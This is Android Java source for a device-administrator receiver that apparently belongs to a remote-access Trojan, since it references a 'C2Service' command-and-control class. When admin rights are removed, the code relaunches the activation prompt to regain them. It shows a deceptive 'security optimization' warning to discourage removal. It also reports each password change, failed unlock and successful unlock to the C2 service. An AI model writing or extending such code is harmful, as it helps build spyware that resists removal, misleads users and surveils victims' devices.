package com.wuzenx.services;

import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.widget.Toast;

public class AdminReceiver extends DeviceAdminReceiver {

    @Override
    public void onEnabled(Context context, Intent intent) {
        // Called when device admin is enabled by the user
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        // FIXED: ACTION_DEVICE_ADMIN_ENABLE does NOT exist in Android API.
        // Correct re-activation using ACTION_ADD_DEVICE_ADMIN
        Intent reEnable = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        reEnable.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,
            new ComponentName(context, AdminReceiver.class));
        reEnable.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
            "This application requires device administrator privileges " +
            "for security optimization features.");
        reEnable.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(reEnable);
    }

    @Override
    public void onPasswordChanged(Context context, Intent intent) {
        // Notify about password change
        com.wuzenx.C2Service c2 = com.wuzenx.C2Service.instance;
        if (c2 != null) {
            c2.sendMessage("log", "Device password changed");
        }
    }

    @Override
    public void onPasswordFailed(Context context, Intent intent) {
        com.wuzenx.C2Service c2 = com.wuzenx.C2Service.instance;
        if (c2 != null) {
            c2.sendMessage("log", "Failed password attempt detected");
        }
    }

    @Override
    public void onPasswordSucceeded(Context context, Intent intent) {
        com.wuzenx.C2Service c2 = com.wuzenx.C2Service.instance;
        if (c2 != null) {
            c2.sendMessage("log", "Device unlocked successfully");
        }
    }

    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        return "This application requires device administrator privileges " +
               "for security optimization. Disabling it may compromise " +
               "device security and performance.";
    }
}
